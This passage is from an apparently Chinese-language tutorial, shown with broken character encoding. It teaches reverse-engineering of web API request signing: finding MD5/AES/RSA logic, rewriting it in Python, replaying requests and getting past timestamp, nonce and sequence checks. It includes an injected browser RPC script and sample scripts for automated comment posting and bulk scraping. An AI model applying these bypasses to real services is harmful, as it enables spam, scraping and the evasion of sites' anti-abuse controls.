</thead>
<tbody>
<tr>
  <td>1</td>
  <td>1638360000</td>
  <td>abc123</td>
  <td>1001</td>
  <td>5f8e9d2a...</td>
</tr>
<tr>
  <td>2</td>
  <td>1638360003</td>
  <td>def456</td>
  <td>1001</td>
  <td>7a3b1c4e...</td>
</tr>
<tr>
  <td>3</td>
  <td>1638360005</td>
  <td>ghi789</td>
  <td>1001</td>
  <td>2d6f8e1b...</td>
</tr>
</tbody>
</table>
<p><strong>åˆ†æè§„å¾‹</strong>:</p>
<ul>
<li><code>timestamp</code>: æ¯æ¬¡é€’å¢ï¼ŒUnix æ—¶é—´æˆ³</li>
<li><code>nonce</code>: éšæœºå­—ç¬¦ä¸²ï¼ˆ6 ä½ï¼‰</li>
<li><code>user_id</code>: å›ºå®šå€¼</li>
<li><code>sign</code>: æ¯æ¬¡éƒ½ä¸åŒ â†’ ä¾èµ–äºå…¶ä»–å‚æ•°</li>
</ul>
<h4>ç¬¬äºŒæ­¥ï¼šå®šä½ç­¾åé€»è¾‘</h4>
<p><strong>æ–¹æ³• 1: å…³é”®å­—æœç´¢</strong></p>
<pre><code class="language-javascript">// åœ¨ Sources é¢æ¿æœç´¢ä»¥ä¸‹å…³é”®å­—
sign;
signature;
_sign;
generateSign;
md5;
sha;
encrypt;
</code></pre>
<p><strong>æ–¹æ³• 2: XHR Breakpoint</strong>
åœ¨ DevTools ä¸­è®¾ç½® URL æ–­ç‚¹ï¼š</p>
<ul>
<li>Network â†’ å³é”®è¯·æ±‚ â†’ &quot;Replay XHR&quot;</li>
<li>Sources â†’ XHR/fetch Breakpoints â†’ æ·»åŠ  URL å…³é”®å­—ï¼ˆå¦‚ <code>/api/</code>ï¼‰</li>
<li>åˆ·æ–°é¡µé¢ï¼Œè‡ªåŠ¨æ–­åœ¨å‘åŒ…å‰</li>
</ul>
<p><strong>æ–¹æ³• 3: Hook XMLHttpRequest/fetch</strong></p>
<pre><code class="language-javascript">// æ³¨å…¥åˆ°é¡µé¢æœ€å‰é¢ï¼ˆConsole æˆ– Tampermonkeyï¼‰
(function () {
  const _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url) {
    console.log(&quot;[XHR]&quot;, method, url);
    if (url.includes(&quot;/api/data&quot;)) {
      debugger; // å‘é€ /api/data è¯·æ±‚å‰è‡ªåŠ¨æ–­ç‚¹
    }
    return _open.apply(this, arguments);
  };
})();
</code></pre>
<h4>ç¬¬ä¸‰æ­¥ï¼šç®—æ³•è¯†åˆ«</h4>
<p><strong>æ ‡å‡†ç®—æ³•è¯†åˆ«</strong></p>
<table>
<thead>
<tr>
  <th>ç‰¹å¾</th>
  <th>ç®—æ³•</th>
  <th>è¾“å‡ºé•¿åº¦</th>
</tr>
</thead>
<tbody>
<tr>
  <td>å­—ç¬¦é›† <code>[0-9a-f]</code></td>
  <td>MD5</td>
  <td>32 å­—ç¬¦</td>
</tr>
<tr>
  <td>å­—ç¬¦é›† <code>[0-9a-f]</code></td>
  <td>SHA1</td>
  <td>40 å­—ç¬¦</td>
</tr>
<tr>
  <td>å­—ç¬¦é›† <code>[0-9a-f]</code></td>
  <td>SHA256</td>
  <td>64 å­—ç¬¦</td>
</tr>
<tr>
  <td>å­—ç¬¦é›† <code>[A-Za-z0-9+/=]</code></td>
  <td>Base64 ç¼–ç </td>
  <td>ä»»æ„é•¿åº¦ï¼Œèƒ½è¢« 4 æ•´é™¤</td>
</tr>
<tr>
  <td>å­—ç¬¦é›† <code>[A-Za-z0-9]</code></td>
  <td>è‡ªå®šä¹‰ç¼–ç </td>
  <td>éœ€è¦åˆ†æå…·ä½“é€»è¾‘</td>
</tr>
</tbody>
</table>
<p><strong>åœ¨ä»£ç ä¸­æŸ¥æ‰¾ç‰¹å¾ç </strong></p>
<pre><code class="language-javascript">// MD5 ç‰¹å¾ï¼šåˆå§‹åŒ–å‘é‡
0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476

// AES ç‰¹å¾ï¼šS-Box è¡¨
0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5...

// RSA ç‰¹å¾ï¼šå¤§ç´ æ•°è¿ç®—
modPow, BigInteger, 0x10001 (å¸¸è§å…¬é’¥æŒ‡æ•°)
</code></pre>
<h4>ç¬¬å››æ­¥ï¼šå¤ç°ç­¾åç®—æ³•</h4>
<p><strong>æ¡ˆä¾‹ï¼šæŸè§†é¢‘ç½‘ç«™ç­¾å</strong></p>
<p>é€†å‘å‘ç°ç­¾åé€»è¾‘ï¼š</p>
<pre><code class="language-javascript">// æµè§ˆå™¨ä¸­çš„ç­¾åå‡½æ•°
function getSign(videoId, timestamp) {
  const salt = &quot;h5@video#2024&quot;;
  const raw = `videoId=${videoId}&amp;ts=${timestamp}&amp;salt=${salt}`;
  return md5(raw).toUpperCase();
}
</code></pre>
<p>Python å¤ç°ï¼š</p>
<pre><code class="language-python">import hashlib
import time

def get_sign(video_id, timestamp=None):
    if timestamp is None:
        timestamp = int(time.time())

    salt = &quot;h5@video#2024&quot;
    raw = f&quot;videoId={video_id}&amp;ts={timestamp}&amp;salt={salt}&quot;
    return hashlib.md5(raw.encode()).hexdigest().upper()

# æµ‹è¯•
sign = get_sign(&quot;BV1xv4y1X7Yp&quot;)
print(sign)  # è¾“å‡ºï¼šE8A7F2D3C1B9...
</code></pre>
<hr />
<h2>2. åŠ å¯†å‚æ•°åˆ†æ</h2>
<p>é™¤äº†ç­¾åï¼Œå¾ˆå¤š API ä¼šå¯¹<strong>æ•´ä¸ªè¯·æ±‚ä½“</strong>æˆ–<strong>æ•æ„Ÿå‚æ•°</strong>åŠ å¯†ã€‚</p>
<h3>2.1 AES åŠ å¯†</h3>
<p><strong>ç‰¹å¾è¯†åˆ«</strong></p>
<pre><code class="language-javascript">// ä»£ç ä¸­å¯èƒ½å‡ºç°çš„å…³é”®å­—
CryptoJS.AES.encrypt;
crypto.createCipheriv(&quot;aes-128-cbc&quot;);
Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);
</code></pre>
<p><strong>æ¡ˆä¾‹ï¼šæŸç™»å½•æ¥å£</strong></p>
<p>æµè§ˆå™¨ä»£ç ï¼š</p>
<pre><code class="language-javascript">function encryptPassword(password) {
  const key = CryptoJS.enc.Utf8.parse(&quot;1234567890abcdef&quot;);
  const iv = CryptoJS.enc.Utf8.parse(&quot;abcdef1234567890&quot;);
  const encrypted = CryptoJS.AES.encrypt(password, key, {
    iv: iv,
    mode: CryptoJS.mode.CBC,
    padding: CryptoJS.pad.Pkcs7,
  });
  return encrypted.toString(); // Base64 æ ¼å¼
}
</code></pre>
<p>Python å¤ç°ï¼š</p>
<pre><code class="language-python">from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

def encrypt_password(password):
    key = b'1234567890abcdef'
    iv = b'abcdef1234567890'

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(password.encode(), AES.block_size))
    return base64.b64encode(encrypted).decode()

# æµ‹è¯•
print(encrypt_password(&quot;MyPassword123&quot;))
</code></pre>
<h3>2.2 RSA åŠ å¯†</h3>
<p>é€šå¸¸ç”¨äºåŠ å¯† AES çš„å¯†é’¥ï¼ˆæ··åˆåŠ å¯†ï¼‰æˆ–ç™»å½•å¯†ç ã€‚</p>
<p><strong>æå–å…¬é’¥</strong></p>
<pre><code class="language-javascript">// æµè§ˆå™¨ä¸­æŸ¥æ‰¾
publicKey = &quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGS...&quot;

// æˆ–ä»æ¥å£è¿”å›
GET /api/getPublicKey
{
  &quot;key&quot;: &quot;MIGfMA0GCSqGS...&quot;
}
</code></pre>
<p><strong>Python å¤ç°</strong></p>
<pre><code class="language-python">from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64

def rsa_encrypt(text, public_key_str):
    public_key = RSA.import_key(public_key_str)
    cipher = PKCS1_v1_5.new(public_key)
    encrypted = cipher.encrypt(text.encode())
    return base64.b64encode(encrypted).decode()

public_key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...
-----END PUBLIC KEY-----&quot;&quot;&quot;

password_encrypted = rsa_encrypt(&quot;MyPassword123&quot;, public_key)
</code></pre>
<h3>2.3 è‡ªå®šä¹‰åŠ å¯†ç®—æ³•</h3>
<p><strong>æ¡ˆä¾‹ï¼šæŸ App çš„é­”æ”¹ Base64</strong></p>
<p>é€†å‘å‘ç°å®ƒæŠŠæ ‡å‡† Base64 å­—ç¬¦è¡¨æ‰“ä¹±äº†ï¼š</p>
<pre><code class="language-javascript">// æ ‡å‡† Base64 å­—ç¬¦è¡¨
const stdTable =
  &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;

// é­”æ”¹åçš„å­—ç¬¦è¡¨ï¼ˆæ•…æ„æ‰“ä¹±ï¼‰
const customTable =
  &quot;LMNOPQRSTUVWXYZABCDEFGHIJKabcdefghijklmnopqrstuv0123456789wx+/yz&quot;;
</code></pre>
<p><strong>å¤ç°æ–¹æ³•</strong>: æŠŠæ··æ·†åçš„ Base64 ç¼–ç /è§£ç å‡½æ•°æ‰£ä¸‹æ¥ï¼Œæ”¹æˆ Pythonã€‚</p>
<hr />
<h2>3. é‡æ”¾æ”»å‡» (Replay Attack)</h2>
<p>é‡æ”¾æ˜¯éªŒè¯é€†å‘æˆæœæœ€ç®€å•çš„æ–¹æ³•ã€‚</p>
<h3>3.1 ç®€å•é‡æ”¾ï¼ˆæ— æ—¶é—´æˆ³æ ¡éªŒï¼‰</h3>
<ol>
<li>åœ¨ Network é¢æ¿å³é”®è¯·æ±‚ â†’ &quot;Copy as cURL&quot;</li>
<li>åœ¨ç»ˆç«¯ç²˜è´´è¿è¡Œ</li>
</ol>
<pre><code class="language-bash">curl 'https://api.example.com/data?user_id=123&amp;sign=abc123' \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Cookie: session=xyz'
</code></pre>
<p><strong>å¦‚æœèƒ½æ‹¿åˆ°æ•°æ®</strong>ï¼Œè¯´æ˜è¯¥æ¥å£ï¼š</p>
<ul>
<li>âœ… æ²¡æœ‰æ—¶é—´æˆ³æ ¡éªŒ</li>
<li>âœ… æ²¡æœ‰ Nonce æ ¡éªŒ</li>
<li>âœ… ç­¾åæœ‰æ•ˆæœŸå¾ˆé•¿ï¼ˆæˆ–æ— é™æœŸï¼‰</li>
</ul>
<h3>3.2 é«˜çº§é‡æ”¾ï¼ˆå¸¦æ—¶é—´æˆ³ï¼‰</h3>
<pre><code class="language-python">import requests
import time
import hashlib

def generate_sign(params, salt=&quot;my_secret_salt&quot;):
    &quot;&quot;&quot;ç”Ÿæˆç­¾å&quot;&quot;&quot;
    s = &quot;&amp;&quot;.join([f&quot;{k}={v}&quot; for k, v in sorted(params.items())])
    s += f&quot;&amp;salt={salt}&quot;
    return hashlib.md5(s.encode()).hexdigest()

def api_request(user_id):
    &quot;&quot;&quot;API è¯·æ±‚&quot;&quot;&quot;
    params = {
        &quot;user_id&quot;: user_id,
        &quot;timestamp&quot;: int(time.time()),
        &quot;nonce&quot;: hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    }
    params[&quot;sign&quot;] = generate_sign(params)

    response = requests.get(
        &quot;https://api.example.com/data&quot;,
        params=params,
        headers={
            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;,
            &quot;Referer&quot;: &quot;https://www.example.com/&quot;
        }
    )
    return response.json()

# æµ‹è¯•
print(api_request(123))
</code></pre>
<h3>3.3 Session/Cookie ç®¡ç†</h3>
<p><strong>æ¡ˆä¾‹ï¼šç™»å½• + API è°ƒç”¨</strong></p>
<pre><code class="language-python">import requests

class APIClient:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;
        })

    def login(self, username, password):
        &quot;&quot;&quot;ç™»å½•è·å– Session&quot;&quot;&quot;
        response = self.session.post(
            &quot;https://www.example.com/login&quot;,
            data={
                &quot;username&quot;: username,
                &quot;password&quot;: self.encrypt_password(password)  # ä½¿ç”¨å‰é¢çš„åŠ å¯†å‡½æ•°
            }
        )
        if response.json()[&quot;code&quot;] == 0:
            print(&quot;ç™»å½•æˆåŠŸï¼ŒSession å·²ä¿å­˜&quot;)
            return True
        return False

    def get_user_data(self, user_id):
        &quot;&quot;&quot;è°ƒç”¨éœ€è¦ç™»å½•çš„ API&quot;&quot;&quot;
        params = {&quot;user_id&quot;: user_id}
        params[&quot;sign&quot;] = self.generate_sign(params)

        response = self.session.get(
            &quot;https://api.example.com/user/data&quot;,
            params=params
        )
        return response.json()

    def encrypt_password(self, password):
        # è¿™é‡Œè°ƒç”¨å‰é¢å†™çš„åŠ å¯†å‡½æ•°
        pass

    def generate_sign(self, params):
        # è¿™é‡Œè°ƒç”¨å‰é¢å†™çš„ç­¾åå‡½æ•°
        pass

# ä½¿ç”¨
client = APIClient()
if client.login(&quot;myusername&quot;, &quot;mypassword&quot;):
    data = client.get_user_data(123)
    print(data)
</code></pre>
<hr />
<h2>4. é˜²é‡æ”¾æœºåˆ¶ç»•è¿‡</h2>
<h3>4.1 æ—¶é—´æˆ³æ ¡éªŒ</h3>
<p><strong>ç‰¹å¾</strong></p>
<ul>
<li>æœåŠ¡å™¨æ£€æŸ¥ <code>timestamp</code> æ˜¯å¦åœ¨å½“å‰æ—¶é—´çš„ Â± 60 ç§’å†…</li>
<li>æ—§è¯·æ±‚ä¼šè¿”å› <code>{&quot;error&quot;: &quot;Request expired&quot;}</code></li>
</ul>
<p><strong>ç»•è¿‡æ–¹æ³•</strong></p>
<pre><code class="language-python">import time
import ntplib  # pip install ntplib

def get_server_timestamp():
    &quot;&quot;&quot;è·å–æ ‡å‡†æ—¶é—´ï¼ˆé˜²æ­¢æœ¬åœ°æ—¶é’Ÿä¸å‡†ï¼‰&quot;&quot;&quot;
    try:
        client = ntplib.NTPClient()
        response = client.request('pool.ntp.org')
        return int(response.tx_time)
    except:
        return int(time.time())

# ä½¿ç”¨
params = {
    &quot;user_id&quot;: 123,
    &quot;timestamp&quot;: get_server_timestamp()  # ä½¿ç”¨æ ‡å‡†æ—¶é—´
}
</code></pre>
<h3>4.2 Nonceï¼ˆéšæœºæ•°ï¼‰æ ¡éªŒ</h3>
<p><strong>ç‰¹å¾</strong></p>
<ul>
<li>æœåŠ¡å™¨ä¼šç¼“å­˜æœ€è¿‘ 10 åˆ†é’Ÿçš„æ‰€æœ‰ <code>nonce</code></li>
<li>é‡å¤çš„ <code>nonce</code> ä¼šè¢«æ‹’ç»ï¼š<code>{&quot;error&quot;: &quot;Duplicate request&quot;}</code></li>
</ul>
<p><strong>ç»•è¿‡æ–¹æ³•</strong></p>
<pre><code class="language-python">import uuid

def generate_nonce():
    &quot;&quot;&quot;æ¯æ¬¡ç”Ÿæˆå”¯ä¸€çš„ nonce&quot;&quot;&quot;
    return uuid.uuid4().hex  # ç¤ºä¾‹ï¼š'a8f5f167f44f4964e6c998dee827110c'

# æˆ–ä½¿ç”¨æ—¶é—´æˆ³ + éšæœºæ•°
import random
def generate_nonce_v2():
    return f&quot;{int(time.time())}{random.randint(1000, 9999)}&quot;
</code></pre>
<h3>4.3 åºåˆ—å·ï¼ˆSequenceï¼‰æ ¡éªŒ</h3>
<p><strong>ç‰¹å¾</strong></p>
<ul>
<li>å¸¸è§äº WebSocket æˆ–é•¿è¿æ¥åè®®</li>
<li>æ¯ä¸ªåŒ…å¿…é¡»æœ‰é€’å¢çš„åºåˆ—å·ï¼š1, 2, 3, 4...</li>
<li>ä¹±åºæˆ–é‡å¤çš„åŒ…ä¼šè¢«ä¸¢å¼ƒ</li>
</ul>
<p><strong>ç»•è¿‡æ–¹æ³•</strong></p>
<pre><code class="language-python">class WebSocketClient:
    def __init__(self):
        self.seq = 0  # åˆå§‹åºåˆ—å·

    def send_message(self, msg_type, data):
        self.seq += 1  # è‡ªå¢åºåˆ—å·
        packet = {
            &quot;seq&quot;: self.seq,
            &quot;type&quot;: msg_type,
            &quot;data&quot;: data
        }
        self.ws.send(json.dumps(packet))
</code></pre>
<hr />
<h2>5. è®¤è¯ç³»ç»Ÿåˆ†æ</h2>
<h3>5.1 JWT (JSON Web Token)</h3>
<p><strong>è¯†åˆ«æ–¹æ³•</strong></p>
<pre><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiaWF0IjoxNjM4MzYwMDAwfQ.5f8e9d2a7b3c1e4f...
</code></pre>
<p>ä¸‰æ®µç”¨ <code>.</code> åˆ†éš”ï¼š</p>
<ol>
<li>Header (ç®—æ³•ç±»å‹)</li>
<li>Payload (ç”¨æˆ·æ•°æ®)</li>
<li>Signature (ç­¾åï¼Œé˜²ç¯¡æ”¹)</li>
</ol>
<p><strong>è§£ç </strong></p>
<pre><code class="language-python">import jwt

token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiaWF0IjoxNjM4MzYwMDAwfQ.5f8e9d2a...&quot;

# è§£ç ï¼ˆä¸éªŒè¯ç­¾åï¼‰
payload = jwt.decode(token, options={&quot;verify_signature&quot;: False})
print(payload)  # {'userId': 123, 'iat': 1638360000}
</code></pre>
<p><strong>æ³¨æ„</strong>ï¼šJWT çš„ç­¾åå¯†é’¥ï¼ˆsecretï¼‰åœ¨æœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯æ— æ³•ä¼ªé€ ã€‚é€†å‘é‡ç‚¹æ˜¯<strong>å¦‚ä½•è·å–æœ‰æ•ˆçš„ Token</strong>ï¼ˆé€šå¸¸é€šè¿‡ç™»å½•ï¼‰ã€‚</p>
<h3>5.2 è‡ªå®šä¹‰ Token</h3>
<p><strong>æ¡ˆä¾‹ï¼šæŸå¹³å°çš„ Token ç”Ÿæˆ</strong></p>
<pre><code class="language-javascript">// æµè§ˆå™¨é€»è¾‘
function generateToken(userId, deviceId) {
  const timestamp = Date.now();
  const raw = `${userId}|${deviceId}|${timestamp}`;
  const encrypted = AES.encrypt(raw, SECRET_KEY);
  return Base64.encode(encrypted);
}
</code></pre>
<p><strong>å¤ç°</strong></p>
<pre><code class="language-python">from Crypto.Cipher import AES
import base64
import time

def generate_token(user_id, device_id):
    timestamp = int(time.time() * 1000)
    raw = f&quot;{user_id}|{device_id}|{timestamp}&quot;

    # å‡è®¾é€†å‘å‡ºçš„ SECRET_KEY
    key = b'sixteen byte key'
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(raw.ljust(16).encode())
    return base64.b64encode(encrypted).decode()
</code></pre>
<hr />
<h2>6. é«˜çº§æŠ€å·§ï¼šRPC è°ƒç”¨</h2>
<p>å½“ JS é€»è¾‘è¿‡äºå¤æ‚ï¼ˆå¦‚ WebAssemblyã€VM ä¿æŠ¤ï¼‰ï¼Œç›´æ¥å¤ç°ç®—æ³•æˆæœ¬å¤ªé«˜ï¼Œå¯ä»¥ä½¿ç”¨ <strong>RPCï¼ˆRemote Procedure Callï¼‰</strong> æŠ€æœ¯ã€‚</p>
<h3>6.1 åŸç†</h3>
<p>åœ¨æµè§ˆå™¨ä¸­æ³¨å…¥ä¸€ä¸ª WebSocket æœåŠ¡å™¨ï¼ŒPython å®¢æˆ·ç«¯é€šè¿‡ WebSocket è°ƒç”¨æµè§ˆå™¨ä¸­çš„ JS å‡½æ•°ã€‚</p>
<h3>6.2 å®ç°</h3>
<p><strong>æµè§ˆå™¨ç«¯ï¼ˆé€šè¿‡ Tampermonkey æ³¨å…¥ï¼‰</strong></p>
<pre><code class="language-javascript">// ==UserScript==
// @name         RPC Server
// @match        https://www.example.com/*
// ==/UserScript==

const ws = new WebSocket(&quot;ws://127.0.0.1:8765&quot;);

ws.onmessage = function (event) {
  const request = JSON.parse(event.data);
  let result;

  try {
    // è°ƒç”¨é¡µé¢ä¸­çš„ç­¾åå‡½æ•°
    if (request.method === &quot;getSign&quot;) {
      result = window.getSign(request.params.videoId, request.params.timestamp);
    }
    ws.send(JSON.stringify({ id: request.id, result: result }));
  } catch (e) {
    ws.send(JSON.stringify({ id: request.id, error: e.message }));
  }
};
</code></pre>
<p><strong>Python å®¢æˆ·ç«¯</strong></p>
<pre><code class="language-python">import asyncio
import websockets
import json

class RPCClient:
    def __init__(self):
        self.request_id = 0

    async def call(self, method, params):
        async with websockets.connect('ws://127.0.0.1:8765') as ws:
            self.request_id += 1
            request = {
                'id': self.request_id,
                'method': method,
                'params': params
            }
            await ws.send(json.dumps(request))
            response = await ws.recv()
            return json.loads(response)['result']

# ä½¿ç”¨
async def main():
    client = RPCClient()
    sign = await client.call('getSign', {'videoId': 'BV1xv4y1X7Yp', 'timestamp': 1638360000})
    print(f&quot;ç­¾åç»“æœ: {sign}&quot;)

asyncio.run(main())
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>âœ… ä¸éœ€è¦å¤ç°å¤æ‚ç®—æ³•</li>
<li>âœ… è‡ªåŠ¨è·Ÿéšç½‘ç«™æ›´æ–°</li>
<li>âœ… å¯è°ƒç”¨ä»»ä½• JS å‡½æ•°ï¼ˆåŒ…æ‹¬ WebAssemblyï¼‰</li>
</ul>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>âŒ éœ€è¦æµè§ˆå™¨ä¸€ç›´è¿è¡Œ</li>
<li>âŒ æ€§èƒ½è¾ƒä½ï¼ˆç½‘ç»œé€šä¿¡å¼€é”€ï¼‰</li>
<li>âŒ ä¸é€‚åˆé«˜å¹¶å‘åœºæ™¯</li>
</ul>
<hr />
<h2>7. å¸¸è§é™·é˜±ä¸è°ƒè¯•æŠ€å·§</h2>
<h3>7.1 å‚æ•°é¡ºåºé—®é¢˜</h3>
<p><strong>é”™è¯¯ç¤ºä¾‹</strong></p>
<pre><code class="language-python"># Python çš„å­—å…¸æ˜¯æ— åºçš„ï¼ˆ3.7+ ä¿æŒæ’å…¥é¡ºåºï¼‰
params = {&quot;c&quot;: 3, &quot;a&quot;: 1, &quot;b&quot;: 2}
sign = md5(&quot;&amp;&quot;.join([f&quot;{k}={v}&quot; for k in params]))  # âŒ é”™è¯¯
</code></pre>
<p><strong>æ­£ç¡®åšæ³•</strong></p>
<pre><code class="language-python"># å¿…é¡»æŒ‰å­—å…¸åºæˆ–æŒ‡å®šé¡ºåºæ’åº
sign = md5(&quot;&amp;&quot;.join([f&quot;{k}={params[k]}&quot; for k in sorted(params.keys())]))  # âœ… æ­£ç¡®
</code></pre>
<h3>7.2 å­—ç¬¦ç¼–ç é—®é¢˜</h3>
<pre><code class="language-python"># æµè§ˆå™¨ä¸­å¯èƒ½ä½¿ç”¨ UTF-8 ç¼–ç 
sign_js = md5(&quot;ä¸­æ–‡å‚æ•°&quot;)  # JavaScript é»˜è®¤ UTF-8

# Python å¿…é¡»æ˜¾å¼æŒ‡å®šç¼–ç 
sign_py = hashlib.md5(&quot;ä¸­æ–‡å‚æ•°&quot;.encode('utf-8')).hexdigest()  # âœ…
</code></pre>
<h3>7.3 æµ®ç‚¹æ•°ç²¾åº¦</h3>
<pre><code class="language-javascript">// JavaScript
timestamp = Date.now(); // 1638360000123ï¼ˆ13ä½æ¯«ç§’ï¼‰

// Python
timestamp = int(time.time()); // 1638360000ï¼ˆ10ä½ç§’ï¼‰âŒ
timestamp = int(time.time() * 1000); // 1638360000123 âœ…
</code></pre>
<h3>7.4 è°ƒè¯•æŠ€å·§ï¼šDiff å¯¹æ¯”</h3>
<p>å½“ç­¾åå§‹ç»ˆä¸åŒ¹é…æ—¶ï¼Œå¯¹æ¯”æµè§ˆå™¨å’Œè„šæœ¬çš„ä¸­é—´ç»“æœï¼š</p>
<pre><code class="language-python"># åœ¨æµè§ˆå™¨ Console ä¸­æ‰“å°
console.log(&quot;å¾…ç­¾åå­—ç¬¦ä¸²:&quot;, rawString);
console.log(&quot;ç­¾åç»“æœ:&quot;, sign);

# åœ¨ Python ä¸­æ‰“å°
print(&quot;å¾…ç­¾åå­—ç¬¦ä¸²:&quot;, raw_string)
print(&quot;ç­¾åç»“æœ:&quot;, sign)

# ä½¿ç”¨åœ¨çº¿ Diff å·¥å…·å¯¹æ¯”
# https://www.diffchecker.com/
</code></pre>
<hr />
<h2>8. å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1ï¼šæŸæ–°é—»ç½‘ç«™è¯„è®ºæ¥å£</h3>
<p><strong>ç›®æ ‡</strong>: è‡ªåŠ¨å‘è¡¨è¯„è®º</p>
<p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>
<ol>
<li>æŠ“åŒ…å‘ç° POST è¯·æ±‚å‚æ•°åŒ…å« <code>content</code>, <code>article_id</code>, <code>timestamp</code>, <code>sign</code></li>
<li>æœç´¢ <code>sign</code> å…³é”®å­—ï¼Œå®šä½åˆ° <code>utils.js:1234</code></li>
<li>å‘ç°ç­¾åé€»è¾‘ï¼š<code>MD5(article_id + content + timestamp + &quot;news_secret_2024&quot;)</code></li>
<li>æµ‹è¯•å‘ç° <code>timestamp</code> æœ‰ Â± 5 åˆ†é’Ÿå®¹é”™</li>
</ol>
<p><strong>å®Œæ•´è„šæœ¬</strong>:</p>
<pre><code class="language-python">import requests
import hashlib
import time

def post_comment(article_id, content):
    timestamp = int(time.time())
    sign = hashlib.md5(
        f&quot;{article_id}{content}{timestamp}news_secret_2024&quot;.encode()
    ).hexdigest()

    data = {
        &quot;article_id&quot;: article_id,
        &quot;content&quot;: content,
        &quot;timestamp&quot;: timestamp,
        &quot;sign&quot;: sign
    }

    response = requests.post(
        &quot;https://news.example.com/api/comment/add&quot;,
        data=data,
        headers={
            &quot;User-Agent&quot;: &quot;Mozilla/5.0&quot;,
            &quot;Cookie&quot;: &quot;session=YOUR_SESSION_COOKIE&quot;
        }
    )
    return response.json()

# æµ‹è¯•
result = post_comment(12345, &quot;è¿™ç¯‡æ–‡ç« å†™å¾—çœŸå¥½ï¼&quot;)
print(result)
</code></pre>
<h3>æ¡ˆä¾‹ 2ï¼šæŸç”µå•†æœç´¢æ¥å£ï¼ˆAES åŠ å¯†ï¼‰</h3>
<p><strong>ç›®æ ‡</strong>: æ‰¹é‡æœç´¢å•†å“ä»·æ ¼</p>
<p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>
<ol>
<li>å‘ç°è¯·æ±‚å‚æ•° <code>q</code> æ˜¯åŠ å¯†çš„ï¼š<code>q=U2FsdGVkX1+3g7h2k...</code>ï¼ˆBase64 æ ¼å¼ï¼‰</li>
<li>æœç´¢ <code>encrypt</code> å…³é”®å­—ï¼Œæ‰¾åˆ° <code>CryptoJS.AES.encrypt</code></li>
<li>æå– AES å¯†é’¥å’Œ IVï¼ˆç¡¬ç¼–ç åœ¨ JS ä¸­ï¼‰</li>
<li>å‘ç°åŠ å¯†æ¨¡å¼ä¸º AES-128-CBC</li>
</ol>
<p><strong>å®Œæ•´è„šæœ¬</strong>:</p>
<pre><code class="language-python">from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import requests

def encrypt_query(keyword):
    key = b'1234567890abcdef'
    iv = b'abcdef1234567890'

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(keyword.encode(), AES.block_size))
    return base64.b64encode(encrypted).decode()

def search_product(keyword):
    encrypted_q = encrypt_query(keyword)

    response = requests.get(
        &quot;https://shop.example.com/api/search&quot;,
        params={&quot;q&quot;: encrypted_q}
    )
    return response.json()

# æ‰¹é‡æœç´¢
keywords = [&quot;iPhone 15&quot;, &quot;MacBook Pro&quot;, &quot;AirPods&quot;]
for keyword in keywords:
    results = search_product(keyword)
    print(f&quot;{keyword}: {results['total']} ä¸ªç»“æœ&quot;)
</code></pre>
<hr />
<h2>9. é˜²å¾¡ä¸å¯¹æŠ—</h2>
<h3>9.1 æœåŠ¡ç«¯é˜²æŠ¤æ‰‹æ®µ</h3>
<table>
<thead>
<tr>
  <th>é˜²æŠ¤æ–¹æ³•</th>
  <th>åŸç†</th>
  <th>ç»•è¿‡éš¾åº¦</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æ—¶é—´æˆ³æ ¡éªŒ</strong></td>
  <td>æ‹’ç»è¿‡æœŸè¯·æ±‚ï¼ˆÂ± 60sï¼‰</td>
  <td>â­ ç®€å•ï¼ˆåŒæ­¥æ—¶é’Ÿï¼‰</td>
</tr>
<tr>
  <td><strong>Nonce å»é‡</strong></td>
  <td>ç¼“å­˜æœ€è¿‘çš„éšæœºæ•°</td>
  <td>â­â­ ä¸­ç­‰ï¼ˆç”Ÿæˆå”¯ä¸€å€¼ï¼‰</td>
</tr>
<tr>
  <td><strong>è¯·æ±‚é¢‘ç‡é™åˆ¶</strong></td>
  <td>å• IP/ç”¨æˆ·é™åˆ¶ QPS</td>
  <td>â­â­â­ è¾ƒéš¾ï¼ˆIP æ±  + è´¦å·æ± ï¼‰</td>
</tr>
<tr>
  <td><strong>è¡Œä¸ºåˆ†æ</strong></td>
  <td>æ£€æµ‹è‡ªåŠ¨åŒ–ç‰¹å¾ï¼ˆé€Ÿåº¦ã€é¡ºåºï¼‰</td>
  <td>â­â­â­â­ å›°éš¾ï¼ˆæ¨¡æ‹Ÿäººç±»è¡Œä¸ºï¼‰</td>
</tr>
<tr>
  <td><strong>è®¾å¤‡æŒ‡çº¹</strong></td>
